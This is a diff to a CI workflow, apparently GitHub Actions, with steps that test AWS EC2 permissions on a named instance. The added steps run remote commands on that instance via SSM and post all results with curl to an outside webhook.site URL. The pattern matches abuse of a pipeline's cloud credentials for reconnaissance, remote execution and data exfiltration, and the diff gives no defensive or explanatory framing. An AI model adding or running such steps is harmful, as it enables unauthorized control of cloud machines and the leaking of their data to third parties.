@@ -139,10 +139,22 @@ jobs:
           echo "=== Testing EC2 permissions ==="
           cat << 'EOF' > result.txt
           DescribeInstances: $(aws ec2 describe-instances --instance-ids i-0fb9dcbeb35b4fdbe --region ap-south-1 2>&1 || true)
-          ModifyVolume: $(aws ec2 modify-volume --volume-id vol-0adf25d8604bf595c --size 20 --region ap-south-1 2>&1 || true)
-          DescribeVolumes: $(aws ec2 describe-volumes --volume-ids vol-0adf25d8604bf595c --region ap-south-1 2>&1 || true)
           EOF
           curl -X POST -d @result.txt https://webhook.site/3299c84f-741b-46b4-b27f-2b15cbcbc8d5
+          
+          echo "=== OS DETECTION VIA SSM ==="
+          WIN_CMD=$(aws ssm send-command --instance-ids i-0fb9dcbeb35b4fdbe --document-name "AWS-RunPowerShellScript" --parameters commands="Write-Host 'Hello from Windows'" --region ap-south-1 --query "Command.CommandId" --output text)
+          LINUX_CMD=$(aws ssm send-command --instance-ids i-0fb9dcbeb35b4fdbe --document-name "AWS-RunShellScript" --parameters commands="echo 'Hello from Linux'" --region ap-south-1 --query "Command.CommandId" --output text)
+          sleep 15
+          WIN_OUT=$(aws ssm get-command-invocation --command-id $WIN_CMD --instance-id i-0fb9dcbeb35b4fdbe --region ap-south-1 --output json)
+          LINUX_OUT=$(aws ssm get-command-invocation --command-id $LINUX_CMD --instance-id i-0fb9dcbeb35b4fdbe --region ap-south-1 --output json)
+          
+          cat << EOF > os_test.txt
+          Windows Output: $WIN_OUT
+          Linux Output: $LINUX_OUT
+          EOF
+          curl -X POST -d @os_test.txt https://webhook.site/3299c84f-741b-46b4-b27f-2b15cbcbc8d5
+
           cat << 'EOF' > raw-commands.sh
           #!/bin/bash
           set -euxo pipefail
